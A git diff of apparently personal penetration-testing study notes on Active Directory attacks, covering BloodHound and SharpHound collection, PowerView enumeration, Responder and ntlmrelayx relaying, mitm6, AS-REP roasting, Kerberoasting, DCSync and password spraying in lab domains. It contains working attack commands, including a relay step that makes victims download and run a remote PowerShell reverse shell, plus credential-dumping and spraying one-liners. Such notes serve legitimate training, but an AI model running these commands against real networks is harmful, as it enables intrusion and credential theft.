@@ -62,6 +62,7 @@
 - [Rubeus](#rubeus)
 - [Rsync](#rsync)
 - [Shells](#shells)
+- [Shares](#shares)
 - [SharpView](#sharpview)
 - [Smbclient](#smbclient)
 - [Smbmap](#smbmap)
@@ -104,7 +105,12 @@ sudo arp-scan -I tun0 --localnet
 
 ## BloodHound & Neo4j
 
-Switch Java to version 11 if there are issues:
+If you don't have more idea about what to do in a domain, you can use bloodhound & neo4j to obtain more information about.
+
+BloodHound: Is a tool that analyze relationship in AD and find different ways to do a privilage escalation.
+neo4j is a database of graph
+
+If you have problems installing you have change the version of java to **11**:
 ```bash
 update-alternatives --config java
 ```
@@ -167,55 +173,126 @@ sudo rm -f /var/lib/neo4j/data/dbms/auth /var/lib/neo4j/data/dbms/auth.ini
 
 Start the service.
 
-Data collection with SharpHound (from Windows):
-```powershell
-Import-Module .\SharpHound.ps1
+You need to upload a ZIP.
+
+You can use an executable [SharpHound](https://github.com/puckiestyle/powershell/blob/master/Sharphound.exe) or a powershell script [SharpHound.ps1](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1) inside the victim machine. You need to have a **powershell session** and upload the file.
+
+1. You have to run the script or download with IEX(New-Object...).
+2. Search the function about bloodhound and how use it
+
+```
 cat SharpHound.ps1 | grep function
+cat SharpHound.ps1 | grep Invoke-BloodHound
+```
+
+3. When you found the function, you have to import the module:
+
+```
+Import-Module .\SharpHound.ps1
+```
+
+4. Then you can use this command and automatically create a zip.
+```powershell
 Invoke-BloodHound -CollectionMethod All
 ```
 
-SharpHound.exe:
-```powershell
-.\SharpHound.exe --help
-.\SharpHound.exe -c All --zipfilename ILFREIGHT
-```
+Now you have to download the zip
 
-Data collection with bloodhound-python (from Linux):
-```bash
-sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
-zip -r ilfreight_bh.zip *.json
-```
-
-Download ZIP in evil-winrm session:
+In evil-winrm session:
 ```
 download "C:/Windows/Temp/test/20250701170038_BloodHound.zip" bloodhound.zip
 ```
 
-Upload ZIP to BloodHound GUI:
+Move the zip file to your attacker machine and upload the ZIP to bloodhound.
+If you click in the left top menu > Analysis >
+
+### SharpHound
+
+Is a C# data collector, is intended to be executed on a domain-joined Windows system.
+
+Move the file to a domained-joined host.
+
+```
+.\SharpHound.exe --help
+```
+
+Run the SharpHound.exe collection from host:
+
+```
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
+```
+
+### bloodhound.py
+
+https://github.com/dirkjanm/bloodhound.py
+
+At the first, you need to have access to a victim machine.
+Then, a community member release a python port which obtain data with valid credentials but without access.
+
+This help us not have to run the collector from a domain host, which can be potentially blocked or set off alerts, but is not the best stealthy method.
+
+To see the options:
+```
+bloodhound-python -h
+```
+
+Executing bloodhound-python or bloodhound.py
+```bash
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all --zip
+```
+
+- `-ns`: Specify the nameserver as the Domain Controller
+- `-c all` told the tool to run all checks.
+
+One time the script finishes, we will see the output files in the current working directory in the format `date_object.json`
+
+### Upload the zip file into the BloodHound GUI
+
+Start the neo4j service, firing up the database an load the data.
+
+```bash
+sudo neo4j start
+```
+
+Now, you can write bloodhound to start the program.
+
+Default credentials: neo4j/neo4j or randomly generated password for the username admin for modern community edition
+
+We need to create a zip with all the json files:
+
+```bash
+zip -r ilfreight_bh.zip *.json
+```
+
+To upload the zip:
 
 ![Pasted image 20260726170043.png](images/Pasted%20image%2020260726170043.png)
 
-Default credentials:
-- Legacy BloodHound: `neo4j / neo4j`
-- BloodHound CE: `admin / randomly_generated_password` (check logs on first run)
+Now the data is uploaded. We can use the analyze tab to run queries against the database.
+
+These queries can be custom using [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/).  Also we can use **built-in path finding** queries on the Analysis tab on the left side of the windows.
+
+You have the query `Find Shortest Paths To Domain Admins` will give us any logical paths to escalate to Domain Administrator privileges or equivalent.
+
+Another feature is that in the `Database Info` tab after uploading data, search for a node such as `Domain Users`, and scroll through of all options under the `Node Info` tab.
+
+To use custom queries you need to pasting into the `Raw Query` box.
 
 ### Search in BloodHound
 
-In the search bar on the top left type `domain:` and select the domain.
+In the search bar on the top left you can type: `domain:` and choose the domain.
 
-Pre-built queries (Analysis tab):
-- `Find Shortest Paths To Domain Admins` — logical paths to escalate to Domain Admin
-- `Find Computers with Unsupported Operating Systems` — outdated/legacy hosts
-- `Find Computers where Domain Users are Local Admin` — hosts where all users have local admin
-- `Database Info` tab → search for a node (e.g. `Domain Users`) → explore `Node Info`
+In the Analysis tab you can find pre-built queries. You can use the query `Find Computers with Unsupported Operating Systems` for finding outdated and unsupported operating system running legacy software.
 
-If you click in the left top menu > Analysis > you can find pre-built queries.
+We can use the query `Find Computers where Domain Users are Local Admin` to see if there are any hosts where all users have local admin rights.
 
-Custom queries via `Raw Query` box. Cheatsheet: https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
+Right click in the relationship, help and you will obtain more information.
 
 ### Remove connections and nodes
 
-Go to http://localhost:7474, add the credentials and do the following query to delete all:
+Go to http://localhost:7474
+Add the credentials
+Do the following query to delete all:
 
 ```
 MATCH (n) DETACH DELETE n
@@ -2239,77 +2316,98 @@ Non-interactive shell — each command spawns a cmd.exe process.
 
 ## Rubeus
 
-Upload binary to victim host.
+"Mimikatz of kerbereros"
 
-```bash
+You can use [Rubeus](https://github.com/GhostPack/Rubeus). You have to upload this binary to victim machine.
+
+asreproasting attack:
+```
 Rubeus.exe asreproast /user:user /domain:domain.local /dc:<hostname>
-Rubeus.exe kerberoast /creduser:s4vicorp.local\user /credpassword:password
+```
+
+Kerberoasting attack:
+```
+Rubeus.exe kerberoast /creduser:domain.local\user /credpassword:password
 ```
 
 ---
 
 ## PowerView
 
-Part of the deprecated [PowerSploit](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) toolkit, maintained in Empire 4.
+PowerView is part of deprecated PowerSploit offensive PowerShell toolkit, this receive updates by [Empire 4](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) framework
 
-Import:
+These are the most useful functions PowerView offers.
+
+| Command / Function | Description |
+| :--- | :--- |
+| **PowerView General** | |
+| `Export-PowerViewCSV` | Appends results to a CSV file. |
+| `ConvertTo-SID` | Converts a user or group name to its SID value. |
+| `Get-DomainSPNTicket` | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account. |
+| **Domain / LDAP Functions** | |
+| `Get-Domain` | Returns the AD object for the current (or specified) domain. |
+| `Get-DomainController` | Returns a list of Domain Controllers for the specified domain. |
+| `Get-DomainUser` | Returns all users or specific user objects in AD. |
+| `Get-DomainComputer` | Returns all computers or specific computer objects in AD. |
+| `Get-DomainGroup` | Returns all groups or specific group objects in AD. |
+| `Get-DomainOU` | Searches for all or specific Organizational Unit (OU) objects in AD. |
+| `Find-InterestingDomainAcl` | Finds object ACLs in the domain with modification rights set to non-built-in objects. |
+| `Get-DomainGroupMember` | Returns the members of a specific domain group. |
+| `Get-DomainFileServer` | Returns a list of servers likely functioning as file servers. |
+| `Get-DomainDFSShare` | Returns a list of all distributed file systems for the current (or specified) domain. |
+| **GPO Functions** | |
+| `Get-DomainGPO` | Returns all GPOs or specific GPO objects in AD. |
+| `Get-DomainPolicy` | Returns the default domain policy or the domain controller policy for the current domain. |
+| **Computer Enumeration Functions** | |
+| `Get-NetLocalGroup` | Enumerates local groups on the local or a remote machine. |
+| `Get-NetLocalGroupMember` | Enumerates members of a specific local group. |
+| `Get-NetShare` | Returns open shares on the local (or a remote) machine. |
+| `Get-NetSession` | Returns session information for the local (or a remote) machine. |
+| `Test-AdminAccess` | Tests if the current user has administrative access to the local (or a remote) machine. |
+| **Threaded 'Meta'-Functions** | |
+| `Find-DomainUserLocation` | Finds machines where specific users are logged in. |
+| `Find-DomainShare` | Finds reachable shares on domain machines. |
+| `Find-InterestingDomainShareFile` | Searches for files matching specific criteria on readable shares in the domain. |
+| `Find-LocalAdminAccess` | Finds machines on the local domain where the current user has local administrator access. |
+| **Domain Trust Functions** | |
+| `Get-DomainTrust` | Returns domain trusts for the current domain or a specified domain. |
+| `Get-ForestTrust` | Returns all forest trusts for the current forest or a specified forest. |
+| `Get-DomainForeignUser` | Enumerates users who are in groups outside of the user's domain. |
+| `Get-DomainForeignGroupMember` | Enumerates groups with users outside of the group's domain and returns each foreign member. |
+| `Get-DomainTrustMapping` | Enumerates all trusts for the current domain and any others discovered. |
+
+The `Get-DomainUser` function provide information on all users.
+
+Import the module:
 ```powershell
 Import-Module .\PowerView.ps1
 ```
 
-| Command | Description |
-| :--- | :--- |
-| **General** | |
-| `Export-PowerViewCSV` | Append results to a CSV file |
-| `ConvertTo-SID` | Convert a user or group name to its SID value |
-| `Get-DomainSPNTicket` | Request Kerberos ticket for a specified SPN account |
-| **Domain / LDAP** | |
-| `Get-Domain` | Returns the AD object for the current (or specified) domain |
-| `Get-DomainController` | Returns a list of Domain Controllers |
-| `Get-DomainUser` | Returns all users or specific user objects in AD |
-| `Get-DomainComputer` | Returns all computers or specific computer objects |
-| `Get-DomainGroup` | Returns all groups or specific group objects |
-| `Get-DomainOU` | Searches for all or specific OU objects |
-| `Find-InterestingDomainAcl` | Finds object ACLs with modification rights set to non-built-in objects |
-| `Get-DomainGroupMember` | Returns the members of a specific domain group |
-| `Get-DomainFileServer` | Returns a list of servers likely functioning as file servers |
-| `Get-DomainDFSShare` | Returns all distributed file systems for the domain |
-| **GPO** | |
-| `Get-DomainGPO` | Returns all GPOs or specific GPO objects |
-| `Get-DomainPolicy` | Returns the default domain policy or DC policy |
-| **Computer Enumeration** | |
-| `Get-NetLocalGroup` | Enumerates local groups on the local or a remote machine |
-| `Get-NetLocalGroupMember` | Enumerates members of a specific local group |
-| `Get-NetShare` | Returns open shares on the local (or a remote) machine |
-| `Get-NetSession` | Returns session information for the local (or a remote) machine |
-| `Test-AdminAccess` | Tests if the current user has administrative access |
-| **Threaded Meta-Functions** | |
-| `Find-DomainUserLocation` | Finds machines where specific users are logged in |
-| `Find-DomainShare` | Finds reachable shares on domain machines |
-| `Find-InterestingDomainShareFile` | Searches for files matching specific criteria on readable shares |
-| `Find-LocalAdminAccess` | Finds machines where the current user has local admin access |
-| **Domain Trust** | |
-| `Get-DomainTrust` | Returns domain trusts for the current domain |
-| `Get-ForestTrust` | Returns all forest trusts for the current forest |
-| `Get-DomainForeignUser` | Enumerates users who are in groups outside of the user's domain |
-| `Get-DomainForeignGroupMember` | Enumerates groups with users outside of the group's domain |
-| `Get-DomainTrustMapping` | Enumerates all trusts for the current domain and any discovered |
+Below we will use it to grab information about a specific user, `mmorgan`.
 
-Common usage:
-```powershell
-# Specific user details
+```PowerShell
 Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+```
 
-# Enumerate group members (with nested groups)
+To enumerate some domain group information we can use `Get-DomainGroupMember`. Adding the `-Recursive` we can enumerate nested group.
+```powershell
 Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+```
 
-# Domain trust mapping
+We can also enumerate domain trust mappings. This enum recursive all the trusts of the domain
+```
 Get-DomainTrustMapping
+```
 
-# Test local admin access on a host
+You can use `Test-AdminAccess` to test for local admin access on either the current machine or remote one.
+
+```powershell
 Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+```
 
-# Accounts with SPN (Kerberoasting candidates)
+We can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.
+
+```powershell
 Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 ```
 
@@ -2317,10 +2415,15 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 
 ## SharpView
 
-.NET version of PowerView.
+Another tool similar to PowerView is SharpView that is build in .NET
 
 ```powershell
 .\SharpView.exe Get-DomainUser -Help
+```
+
+Enumerate information about a specific user.
+
+```powershell
 .\SharpView.exe Get-DomainUser -Identity forend
 ```
 
@@ -2563,51 +2666,77 @@ python3 -m openvasreporting -i report-<id>.xml -f xlsx
 
 ## ActiveDirectory PowerShell Module
 
-Group of PowerShell cmdlets for administering AD environments from the command line.
+Is a group of PowerShell cmdlets for administering an Active Directory environment from the command line.
 
+We're looking a few that are particularly useful for enum AD environments.
+
+To discover modules you can use:
 ```powershell
-# Discover available modules
 Get-Module
+```
 
-# Import if not loaded
+If you don't see the ActiveDirectory module, you can import it:
+```powershell
 Import-Module ActiveDirectory
 Get-Module
 ```
 
-```powershell
-# Domain basic info (SID, functional level, child domains...)
+Obtain basic info about the domain like domain SID, domain functional leve, child domains...
+```
 Get-ADDomain
+```
 
-# Accounts with ServicePrincipalName set (Kerberoasting candidates)
+Now we will use the `Get-ADUser` cmdlet. We will be filtering for accounts with the `Service PrincipalName` property. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack.
+
+```powershell
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
 
-# Domain trust relationships
+We can verify domain trust relationships using `Get-ADTrust`.
+
+```powershell
 Get-ADTrust -Filter *
+```
 
-# Group enumeration
+We can gather AD group information using `Get-ADGroup`.
+```powershell
 Get-ADGroup -Filter * | select name
-Get-ADGroup -Identity "Backup Operators"
+```
 
-# Group members
+To obtain more details about a particular group, you can use:
+```powershell
+Get-ADGroup -Identity "Backup Operators"
+```
+
+Let's get a member listing using the `Get-ADGroupMember`
+```powershell
 Get-ADGroupMember -Identity "Backup Operators"
 ```
 
 ---
 
+## Shares
+
+Shares allow users on a domain to quickly access information relevant to their daily roles and share content with their organization
+
 ## Snaffler
 
-Acquires credentials or sensitive data from AD environments. Obtains a list of hosts and enumerates shares and readable directories. **Must be run from a domain-joined host.**
+Snaffler tool can help us acquire credentials or other sensitive data in Active Directory environment. Snaffler obtain a list of hosts within the domain and the enumerating those hosts for shares and readable directories. It iterates through directories and hunts for files that could improve our position in the assessment.
+
+Snaffler requires that it be run from a domain-joined host.
 
 ```powershell
 Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
-.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
 ```
 
-Flags:
+```powershell
+.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
+```
+
 - `-s`: print results to the console
-- `-d`: domain to search within
-- `-o`: output log file
-- `-v data`: verbose level showing only file results
+- `-d`: specifies the domain to search within
+- `-o`: write the result in a log file.
+- `-v data`: verbose level. Data is the best if only displays results to the screen.
 
 ---
 ---
@@ -2620,9 +2749,10 @@ Flags:
 - [Active Reconnaissance](#active-reconnaissance)
 - [Service Enumeration](#service-enumeration)
 - [LLMNR / NBT-NS Poisoning](#llmnr--nbt-ns-poisoning)
+- [Types of attack](#types-of-attack)
 - [SAMBA Relay](#samba-relay)
 - [NTLM Relay](#ntlm-relay)
-- [AS-REP Roasting](#as-rep-roasting)
+- [AS-REP Roast/Roasting](#as-rep-roastroasting)
 - [Kerberoasting](#kerberoasting)
 - [Golden Ticket Attack](#golden-ticket-attack)
 - [DCSync](#dcsync)
@@ -2906,20 +3036,44 @@ Captured hashes are NTLMv2 → crackable with hashcat mode 5600, but **cannot be
 
 ---
 
+## Types of attack
+
+> [!NOTE]
+> **Types of attacks**
+> - SAMBA Relay
+> - NTLM Relay
+>   - IPv4
+>   - IPv6
+> - AS-REP Roast/Roasting
+> - Kerberoasting
+> - DCSync
+
 ## SAMBA Relay
 
-**Prerequisites:**
-- SMB signing must be enabled but NOT required
-- Must be on the local network
-- User credentials must have remote access
+> [!WARNING]
+> **Prerequisites**
+> - The signature must to be enable but no required or disabled
+> - Must be on the local network
+> - User credentials must have remote login access.
 
-**Flow:**
-1. Attacker sets up a fake SMB server (Responder)
-2. When a user tries to access a nonexistent SMB resource, their NTLM credentials arrive at the attacker
-3. They can be cracked offline (not usable for PTH)
+You as an attacker start a SMB Server that responds to all SMB requests that doesn't exist obtained the hash NTLM of the user.
+
+This is better to do on-site in place of use a vpn.
+
+Configure file: Responder.conf
+
+By default the idea is wait that some user try to access to a share resource of SMB and made a mistake writing or the SMB server is off.
+
+With this, you obtain the hash NTLM of the user, you can't do PTH(Pass The Hash) but you can try to crack it.
+
+If some administrator account is running some service in the network with SMB you can get their credentials. This technique is slow but very easy to do.
 
 ```bash
 python3 Responder.py -I eth0 -rdw
+```
+
+When you obtain the hash you can try to crack it:
+```bash
 john --wordlist=rockyou.txt hashes
 ```
 
@@ -2927,67 +3081,123 @@ john --wordlist=rockyou.txt hashes
 
 ## NTLM Relay
 
-**Prerequisites:** Same as SAMBA Relay.
+> [!WARNING]
+> **Prerequisites**
+> - The signature must to be enable but no required or disabled
+> - Must be on the local network
+> - User credentials must have remote login access.
 
 ### IPv4
 
-**Flow:**
-1. Disable SMB and HTTP in Responder.conf
-2. Create list of target IPs (`targets.txt`)
-3. Launch Responder and ntlmrelayx simultaneously
-4. When someone authenticates, relay attempts credentials on target machines and dumps SAM if admin
+Try to obtain some hash ntlm and check if is an administrator credential of the computers that we indicate in a file.
 
+In the configuration file of the responder(/usr/share/responder/Responder.conf) you can change the value of SMB and HTTP to **off**.
+
+You can create a file with the IP of the target.
+
+The idea is to obtain the authentication obtained with responder and redirect the flow of the auth to the victim machine(indicated in the file) to test if the ntlm is valid and obtain automatically the SAM of the victim machine.
 ```bash
 python3 Responder.py -I eth0 -rdw
+```
+
+```bash
 ntlmrelayx.py -tf targets.txt -smb2support
 ```
 
-To get reverse shell directly:
-```bash
-# Set up Python server and listener
+targets.txt -> Have the computers victim that try the credentials to check if are administration users of the computer and obtain automatically the SAM.
+
+#### Execute commands
+
+You can execute commands and example is obtained a reverse shell.
+
+You have a powershell reverse shell ready and running a python server.
+```
 python3 -m http.server 8000
+```
+
+You have to listening the reverse shell.
+```bash
 rlwrap nc -nlvp 4646
-# Launch ntlmrelayx with command
-ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/revshell.ps1')"
+```
+
+Then with ntlmrelay you can execute command to obtain the reverse shell:
+```bash
+ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/revshell.ps1:8000')"
+```
+
+Start the responder to poisoning the service.
+```bash
+python3 Responder.py -I eth0 -rdw
 ```
 
 ### IPv6
 
-Windows requests IPv6 traffic by default. If IPv4 is patched, IPv6 may not be.
+Sometimes with IPv4 is all well parched and you can't do nothing but sometimes forget to protect IPv6.
+
+You can use mitm6 tool to poisoning the domain and with ntlmrelay we can create a tunnel and use proxychains to connect.
+
+By default, windows machine request IPv6 traffic
+
+With this tool if you check the poisoned computers the **gateway** have your IPv6(IPv6 of you attacking machine) and the **main DNS** with your IPv6.
 
 ```bash
 mitm6 -d domain.local
-ntlmrelayx.py -6 -wh 10.10.10.10 -t smb://10.10.10.15 -socks -debug -smb2support
 ```
 
-After getting admin relay → configure `/etc/proxychains.conf` with `socks4 127.0.0.1 1080` → connect without needing real password.
+Create an interactive session of relays:
+```bash
+ntlmrelayx.py -6 -wh 10.10.10.10(attacker machine) -t smb://10.10.10.15(victim machine) -socks -debug -smb2support
+```
+
+Sometimes when obtain a administrator credential the ntlmrelay doesn't indicate that is admin(the solution is reboot the victim machine). It's very common to do this type of attack several times.
+
+Commands:
+- socks: Show proxies when some user access to some failed resource. Show the AdminStatus(true,false)
 
 ---
 
-## AS-REP Roasting
+If you finally obtained **admin credentials** you can open /etc/proxychains.conf and check or add the proxy configuration: 127.0.0.1 1080 and socks4(no tested for socks5)
 
-**Prerequisite:** Only need a list of users. The attack works against accounts with `UF_DONT_REQUIRE_PREAUTH` enabled.
-
-> Sync clock with DC: `sudo ntpdate <DC_IP>`
-
-**Flow:**
-1. Request TGT without pre-authentication for users in the list
-2. Those that allow it return an encrypted hash
-3. Crack the hash offline
-
+You can try to connected to the machine and you don't need to know the password thanks to the relay.
 ```bash
-impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt
+crackmapexec smb 10.10.10.10 -u 'usuario' -p 'randomstring' -d 'dominio.local'
 ```
 
-With Rubeus (from Windows):
+Dump the hash
+```bash
+crackmapexec smb 10.10.10.10 -u 'usuario' -p 'randomstring' -d 'dominio.local' --sam
+```
+You almost can dump the LSA(Local Security Authority)...
+
+---
+
+## AS-REP Roast/Roasting
+
+> [!NOTE]
+> You only need a list of users
+
+> [!WARNING]
+> Your clock must be synchronized with the clock of the DC.
+>
+> To solve this you can use **rpate** or **ntpdate 10.10.10.10** to sync your computer with the DC time. With **date -s** you can put a new date.
+
+If you have a wordlists of users but **you don't have any password** you can try to obtain a TGT(ticket granting ticket) of this users with **impacket-GetNPUsers** to obtain hash(password) that after you can try to crack it:
+```bash
+impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt -dc-ip <IP> 
+```
+
+This not work always, have to set UF_DONT_REQUIRE_PREAUTH.
+
+If you obtain the hash you can crack with john, hashcat...
+
+You can do either if you have valid credentials, just in case you lose some user.
+```bash
+impacket-GetNPUsers domain.htb/user:password -no-pass -usersfile users.txt -dc-ip <IP> 
+```
+
+asreproasting attack:
 ```
 Rubeus.exe asreproast /user:user /domain:domain.local /dc:<hostname>
-```
-
-Crack:
-```bash
-hashcat -a 0 -m 18200 hash.txt rockyou.txt
-john --wordlist=rockyou.txt hash.txt
 ```
 
 ---
@@ -2998,7 +3208,17 @@ john --wordlist=rockyou.txt hash.txt
 
 **Concept:** Accounts with SPN (Service Principal Name) have a TGS ticket whose hash contains the service password. It can be requested and cracked offline.
 
-> Sync clock with DC: `sudo ntpdate <DC_IP>`
+> [!WARNING]
+> **Your clock must be synchronized with the clock of the DC**
+>
+> To solve this you can use **rpdate** or **ntdate 10.10.10.10** to sync your computer with the DC time. With **date -s** you can put a new date.
+
+This techniques abuse of Kerberos and TGS(Ticket Granting Service) . The ticket have a hash with the password of the user.
+
+This is possible if the account user is SPN(Service Principal Name).
+SPN is a unique identifier that link the account to some services running in the network(ex: IIS, SQL Server, exchange, SharePoint, LDAP...)
+
+The service SPN have a kerberos hash with the password
 
 Is a lateral movement/privilege escalation technique in Active Directory. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account.
 
@@ -3023,47 +3243,67 @@ Install impacket: https://github.com/SecureAuthCorp/impacket
 sudo python3 -m pip install .
 ```
 
-Listing SPN Accounts:
+### Listing SPN Accounts
+
+We can start just gathering a listing of SPNs in the domain. We can authenticate to the domain controller with a cleartext password, NT password hash, or even a Kerberos ticket.
+
 ```bash
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
 ```
 
-Requesting all TGS Tickets:
+We see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket.
+
+### Requesting all TGS Tickets
+
 ```bash
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
 ```
 
-Requesting a single ticket:
+Now with the ticket we can use Hashcat or to a GPU cracking rig
+
+### Requesting a single ticket
+
 ```bash
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
 ```
 
-Saving the TGS Ticket to an Output File:
+### Saving the TGS Ticket to an Output File
+
 ```bash
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
 ```
 
-Cracking the ticket offline with hashcat:
+### Cracking the ticket offline with hashcat
+
 ```bash
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
 ```
 
-Testing Authentication against a Domain Controller:
+### Testing Authentication against a Domain Controller
+
 ```bash
 sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
 ```
 
-Basic usage:
+You can check if is vulnerable with **impacket-GetUserSPNs**
+
 ```bash
-# Check for vulnerable accounts
 impacket-GetUserSPNs domain.htb/user:password
+```
 
-# Get the hashes
+If the output give information of users mean that are vulnerables.
+
+Or you can use `Get-ADUser` from ActiveDirectory module of PowerShell.
+
+You can obtain the hash:
+
+```bash
 impacket-GetUserSPNs domain.htb/user:password -request
+```
 
-# Crack
+To crack the hash you have to save all in a file(ex: hash.txt) and you can try to use john:
+```bash
 john -w:rockyou.txt hash
-hashcat -a 0 -m 13100 hash.txt rockyou.txt
 ```
 
 ### From Windows — setspn.exe
@@ -3107,22 +3347,33 @@ Convert to .kirbi file:
 cat encoded_file | base64 -d > sqldev.kirbi
 ```
 
-kirbi2john.py:
+### kirbi2john.py
+
+We can try to crack it with:
+
 ```bash
 python2.7 kirbi2john.py sqldev.kirbi
 ```
 
-Modifying crack_file for Hashcat:
+This will create a file called crack_file. We need to modify to be able to use Hashcat against the hast
+
+### Modifying crack_file for Hashcat
+
 ```bash
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 ```
 
-Cracking the hash with hashcat:
+You can check if the hash have the correct format to use hashcat `cat sqldev_tgs_hashcat`.
+
+### Cracking the hash with hashcat
+
 ```bash
 hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
 ```
 
-### Automated / Tool Based Routes (Windows)
+### Automated / Tool Based Routes
+
+Now, we are going to see two much quicker ways to perform Kerberoasting attack from Windows Host.
 
 Enumerate the SPN accounts with PowerView:
 ```powershell
@@ -3140,20 +3391,34 @@ Export all tickets to a CSV file:
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 ```
 
-With Rubeus:
+#### Rubeus
+
+We can also use [Rubeus](https://github.com/GhostPack/Rubeus) to perform Kerberoasting
+
+```powershell
+.\Rubeus.exe
+```
+
+#### Using /stats Flag
+
 ```powershell
 .\Rubeus.exe kerberoast /stats
 ```
 
-```powershell
+If you see a password that has not changed from many years ago, it is possible that it will be a weak one.
+
+#### /nowrap flag
+
+We want to obtain the tickets with the admincount attribute set to 1
+```
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 ```
 
 We use `/nowrap` flag to copied the hash more easily for offline cracking.
 
-With Rubeus (basic):
+Kerberoasting attack:
 ```
-Rubeus.exe kerberoast /creduser:s4vicorp.local\user /credpassword:password
+Rubeus.exe kerberoast /creduser:domain.local\user /credpassword:password
 ```
 
 ---
@@ -3217,7 +3482,7 @@ Obtain NTLM hashes of users.
 Only for a user:
 
 ```
-lsadump::dcsync /domain:corp.local /user:krbtgt
+lsadump::dcsync /domain:domain.local /user:krbtgt
 ```
 
 Normally for krbtgt account because is the account that sign all the hashes. This means that if you have the hash of this account, you can create all the TGTs that you want. This allow you to:
@@ -3226,27 +3491,27 @@ Normally for krbtgt account because is the account that sign all the hashes. Thi
 
 For administrator user:
 ```
-lsadump::dcsync /domain:corp.local /user:Administrator
+lsadump::dcsync /domain:domain.local /user:Administrator
 ```
 
 For all users:
 
 ```
-lsadump::dcsync /domain:corp.local /all /csv
+lsadump::dcsync /domain:domain.local /all /csv
 ```
 
 ### impacket-secretsdump
 
 With credentials in clear text:
 ```
-secretsdump.py corp.local/admin:'Password123'@10.10.10.5 -just-dc
+secretsdump.py domain.local/admin:'Password123'@10.10.10.5 -just-dc
 ```
 
 - `-just-dc`: only do DCSync
 
 Only hashes NTLM
 ```
-secretsdump.py corp.local/admin:'Password123'@10.10.10.5 -just-dc-ntlm
+secretsdump.py domain.local/admin:'Password123'@10.10.10.5 -just-dc-ntlm
 ```
 
 ---
@@ -3321,34 +3586,61 @@ enum4linux -P <IP>
 net accounts    # from Windows
 ```
 
-**Spraying from Linux:**
+### From a Linux Host
+
+rpcclient is an excelent option for perform this attack from Linux. One consideration is that a valid login is not immediately, with the response `Authority Name` indicate a successful login.
+
+Bash one-liner adapted
 ```bash
-kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
-sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
 
-Password spraying for LDAP service:
+Using kerbrute for the attack:
+```bash
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+
+Using CrackMapExec
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+```
+
+After getting one (or more!) hits, you can use crackmapexec to validate the credentials quickly against a Domain Controller.
+
+```
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+```
+
+#### Password spraying for LDAP service
+
 ```bash
 netexec ldap <IP> -u user.list -p 'password' --continue-on-success
 ```
 
-**Spraying from Windows (DomainPasswordSpray):**
+### Internal Password Spraying - from Windows
+
+If you're in a domain-joined windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective.
+
+If we're authenticated in the domain, the tool will generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
+
+Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us. We'll supply the `Password` flag and one single password and then use the `-OutFile` flag to write the output to a file.
+
+Load the script:
+
 ```powershell
 Import-Module .\DomainPasswordSpray.ps1
+or
+. .\DomainPasswordSpray.ps1
+```
+
+```powershell
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
 
